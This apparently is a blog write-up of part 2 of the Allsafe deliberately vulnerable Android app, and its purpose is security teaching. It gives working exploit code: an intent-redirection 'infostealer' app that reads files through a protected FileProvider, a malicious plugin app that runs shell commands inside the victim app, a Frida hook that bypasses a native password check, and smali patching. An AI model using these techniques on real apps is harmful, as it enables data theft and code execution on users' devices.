---
layout: single
title:  "Allsafe Android Walkthrough - Part 2"
classes: wide
categories: Android
toc: true
---
## Introduction
[Allsafe](https://github.com/t0thkr1s/allsafe){:target="_blank"} is just another intentionally vulnerable Android application. The app is built with kotlin and contains many vulnerabilities with a nice difficulty curve. The main reason I'm writing a blog about this one is that it contains some nice Android challenges and there are no public writeups for the app till now.

## 15. Insecure Providers
![48](/assets/images/Android/Allsafe/48.jpg){: width="400" height="500"}

This is where my favorite part starts. This challenge speaks about 2 Content Providers. One gets notes from a database and the other is a File Provider. The goal is to assess the implementation and see if you can leak both info from the database and sensitive files accessed by the File Provider.

From `AndroidManifest.xml` we can see the 2 providers are defined as follows:
```xml
<provider android:name="infosecadventures.allsafe.challenges.DataProvider" android:enabled="true" android:exported="true" android:authorities="infosecadventures.allsafe.dataprovider"/>

<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="infosecadventures.allsafe.fileprovider" android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
 </provider>
``` 
Let's start with the easy one (`infosecadventures.allsafe.challenges.DataProvider`). Since it is exported we can directly query it using adb
```bash
adb shell content query --uri "content://infosecadventures.allsafe.dataprovider"
```
![49](/assets/images/Android/Allsafe/49.png)

The second provider is where it gets tricky. The file provider is **not exported** so accessing it directly will result in a `java.lang.SecurityException: Permission Denial` error.

One last thing to mention before I start explaining the vulnerability that is the file provider provides read/write access to files on a special list that can be found in the app resources (`res/xml/provider_paths.xml`)

![50](/assets/images/Android/Allsafe/50.png)

The `files-path` tag points to the App's file directory `/data/data/infosecadventures.allsafe/files/` and that location contains a file stored in `/docs/readme.txt` which is the file that we want to access via the protected File Provider.

![51](/assets/images/Android/Allsafe/51.png)

Now, luckily, this is not the end of the road because the provider has the `android:grantUriPermissions` flag set to `true`. This flag grants permission to perform read operations on the URI via the intent’s data.<br />
One last thing to notice is the code in `infosecadventures.allsafe.ProxyActivity`. You can see that this activity can start other activities based on an `intent` passed to it.

![52](/assets/images/Android/Allsafe/52.png)

This means that `ProxyActivity` can give us access to the protected content provider. To do so I'll have to write a malicious application that sets itself as the recipient of an embedded intent and sets the `Intent.FLAG_GRANT_READ_URI_PERMISSION` flag to give read permission on the provider then have `ProxyActivity` communicate with my app via the below intent

```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.example.infostealer.Leaker");
extra.setData(Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt"));
```
where `com.example.infostealer.Leaker` is an exported activity defined in my malicious application with the below code:
```java
public class Leaker extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leaker);

        try {
            Log.d("Leaked File", IOUtils.toString( getContentResolver().openInputStream(getIntent().getData())) );
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```
The reason such an approach will work is that on Android, if an app does not have the right to access a given Content Provider, but the flags are set to provide access, then the flags will be ignored. But, if it does have access rights, then the same rights are transferred to the app to which the Intent is passed.<br />
And because `ProxyActivity` have access rights, these rights will be transferred to `com.example.infostealer.Leaker` with the intent.

So, below is the full code from `MainActivity.java` and you can also download the full exploit source code [from here](https://github.com/JustAhmed/AndroidStuff/blob/main/InfoStealer.zip){:target="_blank"}

```java
public class MainActivity extends AppCompatActivity {

    private AppBarConfiguration appBarConfiguration;
    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent extra = new Intent();
        extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.example.infostealer.Leaker");
        extra.setData(Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt"));

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("infosecadventures.allsafe", "infosecadventures.allsafe.ProxyActivity"));
        intent.putExtra("extra_intent", extra);
        startActivity(intent);
    }
}
```

Finally, you can run the app and open `logcat` from android studio to search for the `Leaked File` log and you'll see that we successfully managed to read the `readme.txt` file via the non-exported file provider.

![53](/assets/images/Android/Allsafe/53.png)

## 16. Arbitrary Code Execution
![54](/assets/images/Android/Allsafe/54.jpg){: width="400" height="500"}

If you start by looking at the manifest file you'll see that whenever the app starts, it always calls the code in `infosecadventures.allsafe.ArbitraryCodeExecution`. The code calls two methods `invokePlugins` and `invokeUpdate`. I'll only be discussing how to get RCE from `invokePlugins` and the second one should be pretty much similar. 

![55](/assets/images/Android/Allsafe/55.png)

In this above code, the app obtains the `ClassLoader` of any app whose package begins with `infosecadventures.allsafe`. It then tries to find `infosecadventures.allsafe.plugin.Loader` and calls its `loadPlugin` method.<br />
The main issue here is that an attacker can create their own app with a package name that begins with the right prefix, create the specified class with the `loadPlugin` method, and in that method, we can use the `Runtime` object to get code execution in the context of the victim app (Allsafe).<br />

The exploit code for this app is pretty straightforward. I created a new Android application with package name `infosecadventures.allsafe.plugin`, created a class called `Loader`, and below is the code of `Loader.java`:
```java
package infosecadventures.allsafe.plugin;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

public class Loader extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loader);
    }

    public static Object loadPlugin(){
        try {
            Runtime.getRuntime().exec("touch /data/data/infosecadventures.allsafe/compromised1337").waitFor();
        } catch (Exception e){
            throw new RuntimeException(e);
        }
        return null;
    }
}
```

Finally, build and install the app on your device, open `Allsafe`, and then check the data dir to find that `compromised1337` was created with the UID of `Allsafe`.

![56](/assets/images/Android/Allsafe/56.png)

You can download the source code for this exploit [from here](https://github.com/JustAhmed/AndroidStuff/blob/main/plugin.zip){:target="_blank"}

## 17. Native Library
![57](/assets/images/Android/Allsafe/57.jpg){: width="350" height="450"}

The goal here is to bypass a certain password check. The function responsible for these checks is implemented in a native library and we want to use `Frida` to hook the method and disable the checks.

Jumping straight into the code you'll notice a function native function `checkPassword` that is imported from `native_library` library

![58](/assets/images/Android/Allsafe/58.png)

If you inspected the assembly code of that library you'll find the code of the `checkPassword` there 

![59](/assets/images/Android/Allsafe/59.png)

Since it is a boolean function, we can just force it to return true regardless of the password we send to it. To hook a function from a native library we can use `Interceptor` as follows:
```java
var Jni = Module.getExportByName("libnative_library.so", "Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword");
Interceptor.attach(Jni, {
    onEnter:
        function(args){},

    onLeave: 
        function(retval){ retval.replace(1); }
});
```
![60](/assets/images/Android/Allsafe/60.png)

![61](/assets/images/Android/Allsafe/61.jpg){: width="350" height="450"}

## 18. Smali Patch
![62](/assets/images/Android/Allsafe/62.jpg){: width="350" height="450"}

For our final challenge, it appears that there is a mistake in the code of the firewall that made it inactive by default. The goal is to decompile the application, patch the smali code, rebuild, sign and install the new app to confirm the change.

I'll start by opening the application using [APKLab](https://github.com/APKLab/APKLab){:target="_blank"} and go to `allsage/smali_classes2/infosecadventures/allsafe/challenges/SmaliPatch.smali` to find the piece of code that checks if the firewall is active or not.

![63](/assets/images/Android/Allsafe/63.png)

This can be solved in many ways, for example, I can modify the check on line 38 to `if-nez` instead of `if-eqz` and that'll make the `if` condition evaluates to `true` if the firewall is inactive.<br />
I can also modify the value on line 32 from `ACTIVE` to `INACTIVE` and that'll change the if statement to check if the firewall is inactive or not (which it is not by default).  Or i can even change the default value that initialized the firewall to `ACTIVE` instead of `INACTIVE`. It all works and gives the same result we need to trigger the code inside the if statement.

I'll rebuild and install the application again and see if the changes did indeed work.

![64](/assets/images/Android/Allsafe/64.jpg){: width="350" height="450"}

## <i>The End</i>